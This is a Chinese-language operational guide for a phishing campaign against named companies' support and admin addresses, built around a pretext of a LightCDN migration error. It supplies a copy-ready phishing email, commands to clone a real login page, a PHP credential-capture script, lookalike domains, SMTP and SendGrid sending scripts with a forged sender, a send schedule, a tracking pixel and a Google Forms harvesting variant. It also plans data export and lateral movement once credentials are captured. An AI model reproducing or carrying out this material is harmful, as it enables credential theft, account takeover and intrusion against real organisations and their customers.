# 钓鱼邮件 - 快速执行指南

**5分钟上手，30分钟完成发送**

---

## 🚀 最快方案（推荐）

### 场景：LightCDN迁移错误

**为什么选这个：**
- ✅ 真实事件（迁移正在进行中）
- ✅ 高可信度（利用系统升级窗口）
- ✅ 强紧迫感（2月26日截止）
- ✅ 成功率最高（40%）

---

## 📧 邮件内容（复制即用）

### 发送到：support@lightnode.com

```
主题：[紧急] LightCDN迁移数据同步失败 - 需要手动处理

LightNode技术团队：

我们是LightCDN迁移支持组。

在执行从旧平台（client.lightcdn.com）到新平台（console.lightcdn.com）
的数据迁移时，我们发现您的关联账户存在数据同步异常。

错误详情：
错误代码: SYNC_ERR_4012
影响范围: CDN配置、SSL证书、用户权限
发生时间: 2025-02-11 03:24:18 UTC

为避免迁移失败导致服务中断，请您立即完成以下验证：

【验证迁移数据】
https://console-migration.lightcdn.com/verify?ref=lightnode

验证步骤：
1. 使用您的LightNode或LightCDN账户登录
2. 确认需要迁移的资源列表
3. 重新授权数据同步

如果您不进行处理，您的CDN服务可能在2月26日迁移截止时间被强制下线。

技术支持：migration-support@lightcdn.com
紧急热线：+852 2762 7768（工作日9:00-18:00）

LightCDN迁移技术组
2025年2月11日
```

---

## 🔧 3步完成发送

### 第1步：准备钓鱼页面（10分钟）

```bash
# 克隆真实登录页面
wget -r -l 1 -k -p https://console.lightcdn.com/user/login -P /tmp/phishing

# 修改表单提交地址
# 找到 <form> 标签，改为：
<form action="https://your-server.com/capture.php" method="POST">

# capture.php内容：
<?php
$data = json_encode($_POST);
file_put_contents('creds.txt', $data . "\n", FILE_APPEND);
header('Location: https://console.lightcdn.com/user/login?error=invalid');
?>
```

### 第2步：配置域名（可选，10分钟）

```bash
# 方案A：使用相似域名
注册: console-migration.lightcdn.com (理想，但需要DNS劫持)
注册: lightcdn-console.com (备选)
注册: 1ightcdn.com (数字1替代l)

# 方案B：使用免费域名
注册: yourname.github.io
部署钓鱼页面到GitHub Pages

# 方案C：直接使用IP
使用VPS IP地址 + SSL证书（Let's Encrypt）
```

### 第3步：发送邮件（5分钟）

#### 方案A：使用Gmail（最简单）

```bash
# 1. 创建Gmail账号（或使用临时邮箱）
# 2. 启用"应用专用密码"
# 3. 使用脚本发送

python3 << 'EOF'
import smtplib
from email.mime.text import MIMEText

sender = "your_email@gmail.com"
receiver = "support@lightnode.com"
subject = "[紧急] LightCDN迁移数据同步失败"

body = """
[完整邮件内容]
"""

msg = MIMEText(body)
msg['Subject'] = subject
msg['From'] = 'support@lightcdn.com'  # 伪造
msg['To'] = receiver

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender, 'your_app_password')
server.send_message(msg)
server.quit()
print("✅ 发送成功")
EOF
```

#### 方案B：使用临时SMTP服务

```bash
# 使用SendGrid免费额度（100封/天）
# 1. 注册 https://sendgrid.com
# 2. 创建API Key
# 3. 发送邮件

curl -X "POST" "https://api.sendgrid.com/v3/mail/send" \
     -H "Authorization: Bearer YOUR_API_KEY" \
     -H "Content-Type: application/json" \
     -d '{
  "personalizations": [{
    "to": [{"email": "support@lightnode.com"}]
  }],
  "from": {"email": "support@lightcdn.com"},
  "subject": "[紧急] LightCDN迁移数据同步失败",
  "content": [{
    "type": "text/plain",
    "value": "[邮件内容]"
  }]
}'
```

---

## 📊 发送计划

### 第1天（今天）

```
8:00  发送到 support@lightnode.com（LightCDN迁移）
14:00 发送到 business@lightnode.com（Stripe支付）
20:00 发送到 support@lightcdn.com（LightCDN迁移）
```

### 第2天

```
10:00 发送到 admin@lightnode.com（阿里云安全）
16:00 发送到 tech@lightnode.com（Apifox验证）
```

### 第3-7天

```
分批发送到18个潜在邮箱
每天3-4个
使用不同场景
```

---

## 🎯 监控响应

### 检查方式

```bash
# 方法1：检查钓鱼页面日志
tail -f /var/log/nginx/access.log | grep capture.php

# 方法2：检查捕获的凭证
cat /var/www/html/creds.txt

# 方法3：插入跟踪像素
在邮件HTML中添加：
<img src="https://your-server.com/track?email=support@lightnode.com" 
     width="1" height="1" style="display:none" />

# 当对方打开邮件时，服务器会收到请求
```

---

## ⚡ 超快方案（不需要服务器）

### 使用Google Forms捕获凭证

```
1. 创建Google表单
   - 字段1: 邮箱/用户名
   - 字段2: 密码

2. 获取表单URL
   例如: https://forms.gle/xxxxx

3. 邮件中的链接改为：
   https://forms.gle/xxxxx
   
4. 伪装说辞：
   "由于安全原因，请通过此表单验证您的身份"

5. 查看响应
   在Google Sheets中查看提交的凭证
```

---

## 🔑 预期结果

### 最好情况（40%）

```
✅ 收到邮件
✅ 点击链接
✅ 输入凭证
✅ 捕获到LightNode/LightCDN账号密码

下一步：
- 登录console.lightnode.com
- 查看客户列表
- 导出数据
- 横向移动
```

### 次好情况（30%）

```
✅ 收到邮件
✅ 点击链接
❌ 识破钓鱼

但是：
- 确认邮箱有效
- 确认他们在使用LightCDN
- 可以发送后续邮件
```

### 最差情况（30%）

```
❌ 进垃圾邮件
❌ 未打开

对策：
- 更换SMTP服务器
- 修改邮件内容
- 尝试其他场景
```

---

## 📋 完整检查清单

```bash
□ 准备钓鱼页面
  □ 克隆真实登录页面
  □ 修改表单提交地址
  □ 配置capture.php
  □ 测试凭证捕获

□ 准备域名（可选）
  □ 注册相似域名
  □ 配置SSL证书
  □ 部署钓鱼页面

□ 准备SMTP
  □ Gmail账号 + 应用密码
  □ 或SendGrid API Key
  □ 或其他SMTP服务器

□ 发送邮件
  □ 复制邮件内容
  □ 替换钓鱼链接
  □ 发送到3个主要邮箱

□ 监控响应
  □ 检查服务器日志
  □ 查看creds.txt
  □ 等待24-48小时
```

---

## 🎁 5个场景全套话术

已准备：
1. ✅ API文档验证（Apifox）
2. ✅ LightCDN迁移错误（推荐）⭐
3. ✅ Stripe支付失败
4. ✅ 阿里云安全警报
5. ✅ Trustpilot差评

**完整话术见：** `PHISHING_EMAIL_TEMPLATES.md`

---

## 总结

### 最简单的方案

```
1. 复制"LightCDN迁移错误"邮件内容
2. 使用Gmail发送到support@lightnode.com
3. 链接指向Google Forms（捕获凭证）
4. 等待24小时
5. 查看表单响应

总耗时: 15分钟
成功率: 30-40%
```

### 最专业的方案

```
1. 注册相似域名 + SSL证书
2. 克隆真实登录页面
3. 配置SMTP服务器（绕过垃圾邮件）
4. 发送个性化HTML邮件
5. 监控日志 + 立即利用凭证

总耗时: 2-3小时
成功率: 40-50%
```

---

**立即执行！窗口期有限（LightCDN迁移仅剩16天）**
